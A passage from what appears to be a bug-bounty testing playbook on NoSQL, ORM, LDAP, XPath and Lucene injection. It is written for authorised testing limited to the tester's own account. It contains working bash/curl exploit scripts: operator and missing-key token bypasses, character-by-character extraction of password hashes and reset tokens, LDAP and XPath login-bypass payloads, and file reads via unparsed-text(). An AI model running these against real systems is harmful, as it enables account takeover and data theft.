    | grep -vE '\.(AND|OR|NOT|_and|_or|_not|equals|in|notIn|nin|lt|lte|gt|gte|ne|eq|contains|startsWith|endsWith|mode|some|every|none|is|isNot|_operators|regex|exists)$' | sort -u | head -40
  # 2. a JSON scalar argument: the plain value, $eq and $in with the same value, an unknown operator
  Q='query($f:JSON){messages(filter:$f){id text}}'; RA='<A room id>'; RB='<B room id>'    # the operation the client sends
  v() { jq -cn --arg q "$Q" --argjson f "$1" '{query:$q,variables:{f:$f}}'; }
  g base "$(v "$(jq -cn --arg a "$RA" '{room:$a}')")";            g eq  "$(v "$(jq -cn --arg a "$RA" '{room:{"$eq":$a}}')")"
  g in   "$(v "$(jq -cn --arg a "$RA" '{room:{"$in":[$a]}}')")";  g unk "$(v '{"room":{"$nsq005":1}}')"
  # 3. with two-accounts: B's room, bounded to our two ids, then an ownership key the resolver may let win
  g two  "$(v "$(jq -cn --arg a "$RA" --arg b "$RB" '{room:{"$in":[$a,$b]}}')")"; grep -o 'zqxnsq005' "$D/two.json" | wc -l
  g own  "$(v "$(jq -cn --arg a "$RA" --arg b "$RB" '{room:{"$in":[$a,$b]},owner:{"$exists":true}}')")"; grep -o 'zqxnsq005' "$D/own.json" | wc -l
  # 4. a hidden field of A's own record through a generated filter input: a prefix of A's reset token, then a wrong one
  Q2='query($w:UserWhereInput){users(where:$w){id}}'; IDA='<A user id>'; TOK='<token from A reset e-mail>'
  w() { jq -cn --arg q "$Q2" --arg i "$IDA" --arg p "$1" '{query:$q,variables:{w:{id:$i,resetToken:{startsWith:$p}}}}'; }
  g hid1 "$(w "${TOK:0:6}")"; g hid0 "$(w nsq005)"
  ```
  B stored `zqxnsq005` in a message in B's room. With the hidden-field pair in hand, NSQ-006's loop reads the rest
  of the value. Aliases put several conditions in one request: each alias is one database query against `$RATE`.
- **Proof:** the plain and operator variants with their results and the unknown-operator error; then either B's
  marker in A's response from the bounded `$in`, with B's room alone refused, or a hidden field of A's own record
  matched by its real prefix and not by a wrong one, with the output type shown to lack the field.
- **Not a finding when:** the argument is an enum or a generated input whose fields the caller may all read
  (filtering on what you can see). Hasura, PostGraphile and similar engines apply row and column permissions to
  filters as well: a refused hidden column is the permission working, and a missing one is GQL-003.
  `Variable "$f" got invalid value`, `Expected type` or `Cannot parse` is the GraphQL layer, not the database. The
  resolver strips `$` keys (the operator rows equal a plain key). The filter is evaluated by sift or mingo in the
  application process: RCE-007.
- **Escalate:** `$where` accepted in the JSON argument: NSQ-004 inside mongod, RCE-007 in the process (#3782701,
  unauthenticated). The same resolver without a session moves PR to N. Finding injectable arguments for SQL and
  search back ends is GQL-009; row permissions of documented filters are GQL-003.

### NSQ-006 · A Node ORM where-clause (Prisma, Sequelize, Mongoose, TypeORM) built from request JSON turns an object, an array or a missing key into an operator and filters on a field the API never returns

| | |
|---|---|
| **Severity** | Critical standalone when a reset-token or session lookup passes for our account A without its secret (any account follows); High when a hidden field of A's record (password hash, reset token, 2FA secret) is read through an operator or relation filter; Medium for a filter on hidden fields that only confirms a value |
| **Requires** | node, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Handling of Unexpected Data Type · CWE-1287, CWE-943 |
| **Prior art** | #645299, #506654, #319458 |

- **Where:** Node APIs (Express, Nest, Next.js route handlers, Fastify) whose handlers pass request data into the
  model layer: `findFirst({where:{email, token: body.token}})`, `findOne({where: req.query})`,
  `find({where: body.where})`, `Model.find(req.body)`; list endpoints with JSON `where=`, `filter=` or `include=`
  parameters and the filter grammars of Node CMSs and frameworks (LoopBack `filter[where]`, Strapi `filters[...]`,
  Directus `filter[...]`, Payload `where[...]`, Ghost `filter=`). The ORM names itself in errors:
  `PrismaClientValidationError` ("Unknown argument … Available options"), `SequelizeDatabaseError`, Mongoose
  `CastError`, TypeORM `EntityPropertyNotFoundError`. The report library has no Prisma or Sequelize report; the
  cited ones are TypeORM query-building bugs (#506654, #319458) and private data read through GraphQL filters
  (#645299). The mechanism is API-009's type confusion, read through each ORM's own operator names.
- **Test:** three mechanisms, each against our own account. An object where a string is expected becomes an
  operator: Prisma `{"not":"x"}`, `{"startsWith":"…"}`, `{"contains":""}`; Mongoose `{"$ne":"x"}`, `{"$regex":"^…"}`;
  Sequelize `{"$ne":"x"}` only in version 4 or with `operatorsAliases`. A missing key becomes no condition: Prisma
  treats `undefined` as "no filter" and TypeORM 0.3 drops `undefined` from `where`, so
  `findFirst({where:{email, token: undefined}})` matches on the e-mail alone. A client-supplied where-object filters
  through relations on fields the API never returns: `{"author":{"is":{"password":{"startsWith":"$2"}}}}`.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-006"; mkdir -p "$D"; CT='Content-Type: application/json'; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  r() { curl -sS "${HDR[@]}" "${@:2}" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\t"
        grep -aoE 'PrismaClient[A-Za-z]+|Unknown arg(ument)? `[^`]+`|Available (options|args)|Sequelize[A-Za-z]*Error|Invalid value|CastError|EntityPropertyNotFound[A-Za-z]*|"valid" *: *(true|false)' \
          "$D/$1.body" | sort -u | head -3 | paste -sd' '; sleep "$W"; }
  C="$T/api/v1/auth/reset/check"; EA='<A e-mail>'; TK='<token from A reset e-mail>'     # a lookup that changes nothing
  # 1. the ORM names itself, and often the model's fields, for an unknown key
  r unk -X POST "$C" -H "$CT" -d "$(jq -cn --arg e "$EA" '{email:$e,token:{nsq006:1}}')"
  # 2. operator objects and a missing key in the token field, always beside A's e-mail
  { for p in "right:$(jq -cn --arg t "$TK" '$t')" 'wrong:"nsq006-wrong"' "prefix:$(jq -cn --arg t "${TK:0:6}" '{startsWith:$t}')" \
             'prefix-x:{"startsWith":"nsq006"}' 'not:{"not":"nsq006-wrong"}' 'ne:{"$ne":"nsq006-wrong"}'; do
      r "tok-${p%%:*}" -X POST "$C" -H "$CT" -d "$(jq -cn --arg e "$EA" --argjson t "${p#*:}" '{email:$e,token:$t}')"; done
    r tok-missing -X POST "$C" -H "$CT" -d "$(jq -cn --arg e "$EA" '{email:$e}')"     # Prisma and TypeORM 0.3: the token condition vanishes
  } | tee "$D/lookup.tsv"
  # 3. a where-object from the client: A's own post, filtered through its author's hidden field (bcrypt hashes start with $2)
  U="$T/api/v1/posts"; PA='<id of a post A wrote>'
  wq() { r "$1" $A -g --get --data-urlencode "where=$2" "$U"; }
  wq rel-base  "$(jq -cn --arg p "$PA" '{id:$p}')"
  wq rel-true  "$(jq -cn --arg p "$PA" '{id:$p,author:{is:{password:{startsWith:"$2"}}}}')"
  wq rel-false "$(jq -cn --arg p "$PA" '{id:$p,author:{is:{password:{startsWith:"nsq006"}}}}')"
  r rel-qs $A -g "$U?filters[id][\$eq]=$PA&filters[author][password][\$startsWith]=%242"   # the bracket grammar (Strapi, qs)
  r m-hid1 $A -g "$T/api/v1/users?_id=<A user id>&resetToken[\$regex]=%5E${TK:0:6}"        # Mongoose find(req.query): a hidden field filters
  r m-hid0 $A -g "$T/api/v1/users?_id=<A user id>&resetToken[\$regex]=%5Ensq006"
  ```
  ```bash
  # 4. read the first characters of A's hash: an OR over half the candidate prefixes per request, six requests per character
  AL='./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz$'           # bcrypt's alphabet, plus $
  cnt() { jq -r 'if type=="array" then length else (.total // .count // ((.data // .items // .results // [])|length)) end' "$D/$1.body" 2>/dev/null; }
  half() { jq -cn --arg p "$PA" --arg pre "$1" --arg cs "$2" '{id:$p,OR:[($cs|split(""))[] as $c | {author:{is:{password:{startsWith:($pre+$c)}}}}]}'; }
  got='$2'; while [ ${#got} -lt 14 ]; do cs=$AL
    while [ ${#cs} -gt 1 ]; do h=${cs:0:$(( ${#cs} / 2 ))}; wq q "$(half "$got" "$h")" >/dev/null
      if [ "$(cnt q)" -gt 0 ] 2>/dev/null; then cs=$h; else cs=${cs:${#h}}; fi; done
    got="$got$cs"; done; printf '%s\n' "$got" | tee "$D/hash-prefix.txt"
  wq q "$(jq -cn --arg p "$PA" --arg g "$got" '{id:$p,author:{is:{password:{startsWith:$g}}}}')" >/dev/null; echo "check: $(cnt q) result(s) for the whole prefix"
  ```
  Send operators only where A's e-mail or id sits in the same lookup; on a token-only lookup use the six-character
  prefix of A's own token and nothing shorter. Fourteen characters (`$2b$10$` and seven of the salt) are enough
  for the report; the same loop reads the rest. MySQL's default collations compare case-insensitively, so letters
  read there are uncertain: read a hex token instead.
- **Proof:** the right-token control accepted, the wrong string refused, and an operator or a missing key accepted
  for A without A's token; or a hidden field of A's record (the first characters of its password hash, or the reset
  token from A's e-mail) read through a filter, beside a normal response that never contains the field, with the
  whole read prefix confirmed by one request.
- **Not a finding when:** the ORM rejects the object (`PrismaClientValidationError` saying `Expected String`;
  Sequelize 5 and later without aliases: `Invalid value`), or a validator (zod, class-validator, Joi) answers 400
  first. The relation filter gives the same result for the right and the wrong prefix: the field is not filterable
  through that API (an allow-list of filterable fields). The filter grammar is documented and the field is one the
  caller may read; a readable field of another account is BAC-009. A missing key gives `token is required`.
  Prisma's `omit` and Mongoose's `select: false` hide a field from responses and do not stop filtering on it: they
  are the reason the read works, not a defence.
- **Escalate:** the same request shape on the login, reset completion and invitation endpoints: NSQ-002's flow,
  through to a session. A relation filter that reaches another tenant: describe it and show it on B. Raw SQL
  fragments (`literal`, `whereRaw`, `$queryRawUnsafe`) are SQL-011. Strapi, Ghost, Directus and other Node CMSs
  have had advisories for this filter-on-private-field leak: pin the version and take it to the CVE chapter.

### NSQ-007 · A user name or search term is placed into an LDAP filter unescaped, so `*`, `)(` and `|` change which directory entries match

| | |
|---|---|
| **Severity** | Critical standalone when a filter rewritten through the user name signs our account A in with a wrong password; High when attributes of A's own entry are read through the filter; Medium for filter control shown by a wildcard or a boolean pair on A's entry; Low with only an error difference |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | LDAP Injection · CWE-90 |
| **Prior art** | #359290, #1278050, #1278891 |

- **Where:** No further gate: no fact marks a directory back end. Staff and enterprise logins (VPN and
  remote-access portals, intranet SSO, ForgeRock OpenAM or AM, Liferay, Jira or Confluence on LDAP), "find a
  colleague" and address-book searches, group and team pickers, self-service password reset for domain accounts,
  WebFinger on identity servers (#1278050: CVE-2021-29156 in OpenAM), and any form whose error mentions `LDAP`,
  `javax.naming`, `DirectoryServices`, `ldap_search`, `Bad search filter` or `InvalidSearchFilter`. Filters
  usually read `(&(objectClass=person)(uid=INPUT))` or `(|(cn=*INPUT*)(mail=*INPUT*))`.
- **Test:** a value is safe only when `*`, `(`, `)`, `\` and NUL are escaped (`\2a`, `\28`, `\29`, `\5c`, `\00`,
  RFC 4515). Show the opposite on A's entry: A's name with its last character replaced by `*` signs in with A's
  password while the escaped twin does not; `)(objectClass=*` appended keeps the filter true and
  `)(objectClass=nsq007void` makes it false (a pair inside a well-formed filter); a lone `(` raises a filter error
  that `\28` does not. Never send a pattern that can match someone else: a bind with A's password against another
  user's entry counts toward that user's lockout.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-007"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<2)?2:w}')   # binds are slow and logged: two seconds apart
  U="$T/login"; UF=username; PF=password; AT=uid                   # AT: the naming attribute (sAMAccountName on Active Directory)
  ID_A='<A user name, 8 characters or more>'; PW_A='<A password>'
  l() { curl -sS "${HDR[@]}" -X POST "$U" --data-urlencode "$UF=$2" --data-urlencode "$PF=$3" -D "$D/$1.hdr" -o "$D/$1.body" \
          -w "$1\t%{http_code}\t%{size_download}\t%{redirect_url}\t"
        grep -aoiE 'bad search filter|invalid ?(search ?)?filter|javax\.naming\.[A-Za-z.]+|ldap_[a-z_]+\(\)|DirectoryServices[A-Za-z.]*|unbalanced parenthes[ie]s|LDAPException' "$D/$1.body" | head -1; echo; sleep "$W"; }
  { l right "$ID_A" "$PW_A";  l wrong "$ID_A" nsq007-wrong
    l star  "${ID_A%?}*" "$PW_A";  l star-esc "${ID_A%?}\\2a" "$PW_A"        # a pattern signs A in; its escaped twin must not
    l true  "$ID_A)(objectClass=*" "$PW_A";  l false "$ID_A)(objectClass=nsq007void" "$PW_A"
    l paren "$ID_A(" "$PW_A";  l paren-esc "$ID_A\\28" "$PW_A"
    l pw-or "$ID_A)(|($AT=$ID_A" nsq007-wrong      # where the filter tests the password: (&(uid=A)(|(uid=A)(userPassword=x)))
  } | tee "$D/login.tsv"
  # with the pair in hand, one attribute of A's own entry: its real first letters against wrong ones (each false is a failed login for A)
  MA='<A e-mail>'; l attr-t "$ID_A)(mail=${MA:0:2}*" "$PW_A"; l attr-f "$ID_A)(mail=zq*" "$PW_A"
  # a directory search: the term inside (cn=*TERM*); A's own entry is the only true branch
  S="$T/directory/search"; NA='<A full name as the directory shows it>'
  s() { curl -sS "${HDR[@]}" $A --get --data-urlencode "q=$2" "$S" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\t"; grep -c "$NA" "$D/$1.body"; sleep "$W"; }
  { s none "nsq007zz";  s own "$NA"
    s true "nsq007zz*)(cn=$NA";  s false "nsq007zz*)(cn=nsq007void"
    s paren "nsq007zz(";  s paren-esc "nsq007zz\\28"
  } | tee "$D/search.tsv"
  ```
  Each true and false pair needs a filter that stays well-formed: `INPUT)(...` works inside `(&...(uid=INPUT))` and
  `(|(cn=*INPUT*)...)`; a bare `(uid=INPUT)` gives the same error for both members, and then the wildcard rows are
  the proof.
- **Proof:** `login.tsv`: the right and wrong controls, the wildcard name accepted with A's password and its
  escaped twin refused, the true and false pair, and the filter error for `(` that `\28` does not raise; for the
  bypass, the `pw-or` row signing A in with a wrong password and `me` showing A. For a search: A's entry returned by
  the injected true branch and not by the false one. No other entry was matched or returned.
- **Not a finding when:** `*` works because the application offers prefix search (it escapes the term and adds its
  own `*`: the escaped twin and the `)(` pair tell the difference). Every metacharacter gives the same "invalid
  user name" (input validation). A generic 500 follows any odd character, including ones LDAP ignores (`'`, `"`).
  The directory is the organisation's public phone book and the "read" is a field it publishes. A crash or hang on
  a malformed filter is denial of service (#906959, #907311): do not repeat it (`dos`).
- **Escalate:** send A's name with an empty password once: success is an unauthenticated simple bind accepted as a
  login (RFC 4513 section 5.1.2), a Critical authentication bypass filed under AUT. OpenAM's WebFinger injection is
  CVE-2021-29156 (#1278050, #1278891): verify it by version and the advisory's request in the CVE chapter. An
  anonymous bind to the directory server itself is NET-005's.

### NSQ-008 · A login or lookup value is concatenated into an XPath expression, so a quote and `and` conditions change the answer and read the XML document

| | |
|---|---|
| **Severity** | Critical standalone when a condition signs our account A in with a wrong password; High when A's stored password or a local file is read through XPath 2.0 or 3.0 functions; Medium for a boolean pair on A's account with the document's structure read |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | XML Injection · CWE-643, CWE-91 |
| **Prior art** | #852316, #824925, #1133573 |

- **Where:** No further gate: no fact marks a server-side XML store. Logins and lookups of legacy Java, .NET and
  PHP applications and appliances that keep users or content in XML files; product, store and help-topic lookups by
  name or code; SOAP services over an XML database (eXist, BaseX, MarkLogic: XQuery); configuration and
  localisation lookups (`//string[@name='INPUT']`). Errors that name it: `XPathException`,
  `XPathExpressionException`, `Invalid predicate`, `Expression must evaluate to a node-set`, `DOMXPath::query()`,
  `SimpleXMLElement::xpath()`, `XPathEvalError`, `XPST0003`. The library holds only static-analysis bounties for
  XPath and XQuery (#852316, #824925, #1133573) and no field report: a triager weighs this by what the read shows.
- **Test:** the boolean pair on A's account (`A' and '1'='1` signs in with A's password, `A' and '1'='2` does not),
  then reads that touch no one else: the root element's name, the element that holds A's record and A's own
  password node, and on an XPath 2.0 or 3.0 engine (Saxon) `unparsed-text()`. `A' or 'a'='b` with a wrong password
  reads `name='A' or ('a'='b' and pass='x')` and signs in only A. Never `' or '1'='1`: it returns the first user in
  the document.
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  U="$T/login"; UF=user; PF=pass; ID_A='<A user name>'; PW_A='<A password>'; MARK='<text only a signed-in response contains>'
  x() { curl -sS "${HDR[@]}" -X POST "$U" --data-urlencode "$UF=$2" --data-urlencode "$PF=$3" -D "$D/$1.hdr" -o "$D/$1.body" \
          -w "$1\t%{http_code}\t%{size_download}\t"; if grep -qF "$MARK" "$D/$1.body"; then printf 'in\t'; else printf 'out\t'; fi
        grep -aoE 'XPath[A-Za-z]*Exception|Invalid predicate|must evaluate to a node-set|DOMXPath::[a-z]+\(\)|SimpleXMLElement::xpath|XPathEvalError|XP[A-Z]{2}[0-9]{4}' "$D/$1.body" | head -1; echo; sleep "$W"; }
  { x right "$ID_A" "$PW_A";  x wrong "$ID_A" nsq008-wrong
    x quote "$ID_A'" "$PW_A"                                                 # an XPath error, or a plain failed login
    x true  "$ID_A' and '1'='1" "$PW_A";  x false "$ID_A' and '1'='2" "$PW_A"
    x dtrue "$ID_A\" and \"1\"=\"1" "$PW_A"                                  # the expression may quote with "
    x or    "$ID_A' or 'a'='b" nsq008-wrong                                   # A without A's password
  } | tee "$D/login.tsv"
  ```
  ```bash
  # reads through the pair. XPath 1.0 has no ord(): the position of each character in AL is found by binary search
  # on string-length(substring-before(AL, c)); ~ stands for a character outside AL
  AL='~_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-.@'
  ask() { x a "$ID_A' and ($1) and '1'='1" "$PW_A" | grep -q $'\tin\t'; }
  ask "1=1" && ! ask "1=2" || echo "the oracle is not clean: stop"
  rd() { local e=$1 out="" i lo hi mid; for i in $(seq 1 "$2"); do ask "string-length($e)>=$i" || break; lo=0; hi=$(( ${#AL} - 1 ))
           while [ "$lo" -lt "$hi" ]; do mid=$(( (lo + hi + 1) / 2 ))
             if ask "string-length(substring-before('$AL',substring($e,$i,1)))>=$mid"; then lo=$mid; else hi=$((mid - 1)); fi; done
           out="$out${AL:lo:1}"; done; printf '%s\n' "$out"; }
  rd 'name(/*[1])' 24 | tee "$D/root.txt"                                          # the document's root element
  rd "name(//*[text()='$ID_A']/..)" 24 | tee "$D/record.txt"                         # the element that holds A's record
  rd "string(//*[text()='$ID_A']/../*[contains(name(),'ass')][1])" 32 | tee "$D/a-password.txt"   # compare with PW_A
  ask "lower-case('A')='a'" && echo "XPath 2.0 or later"                            # 1.0 has no lower-case(): an error, so false
  ask "string-length(unparsed-text('file:///etc/hostname'))>0" && rd "normalize-space(unparsed-text('file:///etc/hostname'))" 40 | tee "$D/hostname.txt"
  ```
  Each question is a sign-in attempt for A; when A locks after a few failures, run the reads on a lookup endpoint
  with the same expression instead of the login.
- **Proof:** the true and false pair on A's login or lookup, the `or` row signing A in with a wrong password when it
  does, and the root element's name and A's own password node read through the oracle (the password equal to
  `PW_A`); for XPath 3.0, the host name read with `unparsed-text()`. Every request carries A's name; no other user's
  node is read.
- **Not a finding when:** the quote gives the same "invalid credentials" as any wrong name and the pair does not
  differ (a bound variable through `XPathVariableResolver`, or a pattern check). The error is SQL or LDAP: SQL-001,
  NSQ-007. The XML is a public catalogue and the "read" is data the site already shows. `lower-case()` fails and
  the document holds nothing private: XPath 1.0 reaches only the document, so rate on what it contains.
- **Escalate:** with `oob`, `doc-available('http://nsq008.<OOB host>/x.xml')` makes the engine fetch a URL: an SSRF
  with SSR-002's oracle. `unparsed-text()` beyond one innocuous file is out of bounds. XQuery back ends (`XQST` and
  `XPST` error codes) also run `fn:doc` and may support the update facility: describe it, do not use it. A
  stylesheet taken from the user is XXE-010.

### NSQ-009 · A search parameter is parsed as Lucene query syntax (Elasticsearch `query_string`, Solr), so field names, booleans and local parameters query fields the search is not meant to expose

| | |
|---|---|
| **Severity** | High standalone when a field the results never display (an e-mail, a private flag, a token) is read from our own record through field-qualified queries, or B's private document is returned; Medium when another index or core is queried (names and counts only); Low for syntax accepted that returns only what the search already exposes |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | NoSQL Injection · CWE-943 |
| **Prior art** | #952501, #953203, #844428, #3694007 |

- **Where:** No further gate: no fact marks a search engine. Site and in-app search, autocomplete, leaderboards and
  filtered lists served from an index (#952501: a `user_id` parameter that became a Solr `fq`), advanced-search
  boxes, log and audit viewers, GraphQL `search` and `sort` arguments (#3694007: an Elasticsearch sort query).
  Signs: Lucene syntax changes the results (`a AND b`, `title:x`, `"phrase"`, `x*`); responses carry `took`,
  `hits.total`, `_score`, `_index` or Solr's `responseHeader` and `numFound`; errors say `parse_exception`,
  `query_shard_exception`, `search_phase_execution_exception`, `org.apache.solr` or `SyntaxError: Cannot parse`.
- **Test:** the term goes into a `query_string` (or Solr `q` and `fq`) and not into a `match` query: Lucene
  operators work, and field names reach fields the page never shows. Prove it on a record A created with a marker:
  a field-qualified condition on A's record that is true for A's real value and false for a wrong one, on a field
  the response omits. For Solr, a LocalParams prefix (`{!...}`) at the start of the value switches the query parser
  (#953203, #844428).
- **How:**
  ```bash
  D="$E/evidence/$H/NSQ-009"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{w=1/r; print (w<1)?1:w}')
  U="$T/api/v1/search"; P=q; M='zqxnsq009'; MA='<A e-mail>'          # A stored M in the title of one of A's own records
  s() { curl -sS "${HDR[@]}" $A --get --data-urlencode "$P=$2" "$U" -o "$D/$1.body" -w "$1\t%{http_code}\t%{size_download}\t"
        printf 'hits=%s\t' "$(grep -o "$M" "$D/$1.body" | wc -l)"
        grep -aoE 'parse_exception|query_shard_exception|search_phase_execution_exception|Cannot parse[^"]{0,50}|org\.apache\.solr[A-Za-z.]*|undefined field [A-Za-z_.]+|Cross-core join[^"]{0,40}' "$D/$1.body" | head -1; echo; sleep "$W"; }
  { s base "$M";  s and "$M AND $M";  s not "$M AND NOT $M"              # Lucene: hit, hit, none. A match query: hit, hit, hit
    s wild "${M%???}*";  s fld "title:$M";  s nof "nsq009nofield:$M"
    s err1 "$M)";  s err2 "\"$M"                                          # the engine's own parse error
    s ex1 "$M AND _exists_:email";  s ex0 "$M AND _exists_:nsq009nofield" # a field the results never show
    s pf1 "$M AND email:${MA:0:3}*";  s pf0 "$M AND email:zq*"           # A's e-mail answers by prefix
    s lp1 "{!term f=title}$M";  s lp0 "{!term f=title}nsq009x"           # Solr LocalParams switch the parser
    s join "{!join from=id to=id fromIndex=nsq009nocore}$M"              # "no such core": the join parser is reachable
  } | tee "$D/search.tsv"
  # an API that forwards a query DSL object (a JSON "query", "sort" or "_source" field): every stored field of A's record
  curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' \
    -d "$(jq -cn --arg m "$M" '{query:{bool:{filter:[{match_phrase:{title:$m}}]}},_source:["*"],size:1}')" -o "$D/dsl.body" -w 'dsl %{http_code}\n'
  jq -c '.. | objects | select(has("_source")) | ._source | keys' "$D/dsl.body" 2>/dev/null | head -3
  ```
  Replace `email` with the hidden field that matters on this index (the names show in errors, in `_source` keys
  from the DSL request, and in the bundles). A join into a real core is sent once, with A's marker as the only
  matching record, to count that record and nothing else.
- **Proof:** `search.tsv` with the base row, the Lucene-only rows (`AND NOT` empty, field-qualified hits) and, for
  one field the results never display, the true row for A's real value and the false row for a wrong one, plus A's
  own view showing the field is not shown; or B's private document's marker returned to A (two accounts) with B's
  direct link refused. For Solr, the LocalParams rows behaving as their parser and not as text.
- **Not a finding when:** the search documents Lucene syntax (a log viewer, a developer portal, `field:value`
  qualifiers in the help) and every field it reaches is one the caller may see. Wildcards and booleans return only
  what plain search returns: the engine working, Low at best (#952501 was judged so; #953203 and #844428 paid $150
  and $100). The hidden-field condition is true for wrong values as well: the field is not indexed, or the analyzer
  split it. The response is the WAF's. A leading wildcard or a regular-expression query (`/.*.*.*/`) that runs slowly
  is `dos`.
- **Escalate:** a `script`, `script_fields` or script-based `sort` accepted: RCE-007 (#3694007), harmless check
  only. Other users' documents in a widened result: BAC-009's proof with B. An Elasticsearch or Solr reachable
  directly is NET-005 or CVE-008. Solr's XML query parser and config API have their own advisories: the CVE
  chapter, by version.

## Graveyard

- **An operator that is honoured and reads nothing.** `[$ne]` or `{"$gt":""}` returning more of the records the
  caller could list anyway, or a 500 on `{"$foo":1}`: a missing type check with nothing across a boundary. Park it
  as NSQ-001 and finish NSQ-002 or NSQ-003 before writing.
- **Error text from the engine** (`version-disclosure`). `CastError`, `unknown operator`, a
  `PrismaClientValidationError` that lists the model's fields, `parse_exception`, `Bad search filter`, an
  `XPathException` stack trace. It aims the next request; it is a finding only with a read.
- **Enumeration through a regular expression or a wildcard** (`user-enum`). A login, sign-up or reset lookup that
  confirms an e-mail exists through `$regex` or `*` is account enumeration on most programmes; #397445 enumerated
  customer and administrator e-mails through MongoDB injection and carries no bounty. It pays when it reads a secret
  (NSQ-002) or private data (NSQ-003).
- **A login bypass shown on someone else's account.** `{"username":{"$ne":""},"password":{"$ne":""}}` signs in as
  the first user in the collection, usually a real administrator. It breaks the rules even when it is true; NSQ-002
  shows the same bug on A.
- **Slow regular expressions and per-document sleeps** (`dos`). Catastrophic patterns in `$regex` (`^(a+)+$`),
  Lucene regex and leading-wildcard queries, and `$where` with an unconditional `sleep` load the database. ReDoS
  reports are closed or excluded; never measure them.
- **LDAP injection that crashes the service** (`dos`). #906959 and #907311 (Node modules) were filed as denial of
  service through a malformed filter; on a programme, the request that crashes a login service is not sent twice.
- **Lucene syntax in a search box.** Wildcards, phrases and booleans that return only what plain search returns are
  search. A Solr filter-query change without data was judged low (#952501, still $2,000); LocalParams injections
  paid $150 and $100 (#953203, #844428).
- **Open databases and directories found by a port scan.** An unauthenticated MongoDB, Elasticsearch, CouchDB,
  Firebase or LDAP server is not injection (#267161, #159536, #736283, #1869184): NET-005 and the CLD items.
- **Static-analysis findings without a request.** The four paid reports filed under this class are CodeQL query
  bounties (#1212273, #787113, #956295, #852316). A sink found in the programme's public source is a finding only
  when a request to an in-scope host reaches it.
- **Scanner output** (`automated`). NoSQLMap or a template that says "injectable" without a true and false pair and
  a read.
- **Predictable ObjectIds.** Computing a MongoDB ObjectId from its timestamp and counter (#3687142) is an
  access-control finding (BAC-005), not injection.
- **One missing type check, many methods.** One helper used by many endpoints is one report. Separate methods with
  separate missing checks have been reported one by one (#3852135 calls itself the unpatched sibling of #1446767).
- **Search keys and hosted indices** (`third-party`). An Algolia search-only key in the bundle is public by design;
  a hosted search service's query parser is the vendor's code. What the key can read or write is API-010's
  question.

## Chains

- NSQ-001 → NSQ-002, NSQ-003, NSQ-004, NSQ-006: an honoured operator is the entry to each.
- API-009 (a typed JSON value at a secret check) ↔ NSQ-002: the same requests. An object accepted because the
  database matched it is NSQ-002; a type compared loosely in code is API-009.
- NSQ-002 → AUT: account takeover through a reset token read for A; AUT-005 when a code check is passed. One report
  under the root cause.
- NSQ-003 → BAC-002, BAC-009: the impact is another account's data; the weakness is the operator.
- NSQ-004 ↔ RCE-007: `$where` inside mongod here, `$where` in the application process (sift, mingo) there
  (#3782701).
- NSQ-005 ↔ GQL-009 (injectable GraphQL arguments for every back end) and GQL-003 (row permissions of documented
  filters).
- NSQ-006 ↔ SQL-011 (ORM methods that take raw SQL) and BAC-009 (filters on hidden fields without injection).
- NSQ-007 → AUT (an LDAP login passed) and NET-005 (the directory server itself); its WebFinger case → CVE
  (CVE-2021-29156).
- NSQ-008 → SSR-002 (XPath 2.0 `doc()` as a fetcher), LFI (`unparsed-text()`), XXE-010 (a user's XSLT).
- NSQ-009 → RCE-007 (Painless in `sort` or `script_fields`, #3694007); CVE (Solr's XML parser and config API, by
  version).
- INF-006, INF-007, INF-009 (debug pages and errors that name Mongoose, Prisma, JNDI or Solr) → NSQ-001, NSQ-006,
  NSQ-007, NSQ-009: the exact engine and field names without guessing.
- SSR (an internal Elasticsearch or Solr reached through a fetcher) → NSQ-009's syntax in the fetched URL,
  read-only.
- Cypher (Neo4j), CQL (Cassandra) and SOQL (Salesforce; #1039821 was a second-order SOQL injection) are built as
  strings like SQL: SQL-001's quote and boolean pairs and SQL-008's stored values apply, in that language's syntax.

## Sources

- `kb/reports/nosqli.md` and `kb/reports/all/nosqli.md`: the disclosed reports this chapter is built from;
  `kb/reports/graphql.md` and `kb/reports/sqli.md` hold the ones filed there that touch it (#3782701, #3694007,
  #952501).
- HexBrain: `get_testing_playbook {"topic":"NoSQL injection"}`, `find_payloads {"topic":"NoSQL Injection"}`,
  `find_payloads {"topic":"LDAP Injection"}`, `find_payloads {"topic":"XPATH Injection"}`,
  `find_bypasses {"protection":"mongo sanitize"}`.
- PortSwigger Web Security Academy, NoSQL injection; OWASP WSTG-INPV-05.6 (NoSQL injection), WSTG-INPV-05.7 (ORM
  injection), WSTG-INPV-06 (LDAP injection) and WSTG-INPV-09 (XPath injection); PayloadsAllTheThings, NoSQL
  Injection, LDAP Injection and XPATH Injection.
- MongoDB manual: query operators, `$where`, `$function` and `security.javascriptEnabled`; Mongoose documentation
  on query casting and `sanitizeFilter`; Prisma documentation on filter conditions and on null and undefined;
  the Express 5 migration guide on the default query parser.
- elttam, "plORMbing your Django ORM" and "plORMbing your Prisma ORM with Time-based Attacks" (2024): relation
  filters on hidden fields.
- RFC 4515 (LDAP string filters and their escapes); RFC 4513 section 5.1.2 (the unauthenticated simple bind); Chema
  Alonso et al., "LDAP Injection & Blind LDAP Injection" (Black Hat Europe 2008).
- W3C XPath and XQuery Functions and Operators 3.1 (`doc-available()`, `unparsed-text()`); the Elasticsearch
  `query_string` reference; Apache Solr, "Local Params" and the join query parser.
